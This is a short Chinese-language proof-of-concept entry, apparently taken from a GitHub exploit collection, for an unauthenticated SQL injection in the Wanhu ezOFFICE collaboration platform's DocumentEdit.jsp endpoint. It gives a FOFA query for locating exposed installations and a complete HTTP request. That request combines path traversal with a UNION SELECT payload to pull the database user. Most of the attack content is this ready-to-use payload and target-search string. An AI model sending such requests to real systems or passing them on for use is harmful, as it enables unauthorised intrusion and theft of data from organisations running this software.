## 万户 ezOFFICE DocumentEdit.jsp SQL注入

>万户ezOFFICE协同管理平台是一个综合信息基础应用平台分为企业版和政务版。解决方案由五大应用、两个支撑平台组成，分别为知识管理、工作流程、沟通交流、辅助办公、集成解决方案及应用支撑平台、基础支撑平台。

## 来源

[https://github.com/wy876/POC](https://github.com/wy876/POC/blob/main/%E4%B8%87%E6%88%B7%20ezOFFICE%20DocumentEdit.jsp%20SQL%E6%B3%A8%E5%85%A5.md)

## 简介

万户ezOFFICE中存在SQL注入漏洞，未经过身份认证的攻击者可以通过DocumentEdit.jsp接口进行SQL注入，从而获取数据库中的敏感信息。

## 漏洞类型

SQL注入

## 网络绘测

### fofa

```
app="ezOFFICE协同管理平台"
```

## POC

```http
GET /defaultroot/iWebOfficeSign/OfficeServer.jsp/../../public/iSignatureHTML.jsp/DocumentEdit.jsp?DocumentID=1'%20union%20select%20null,null,(select%20user%20from%20dual),null,null,null,null,null,null,null%20from%20dual-- HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
```

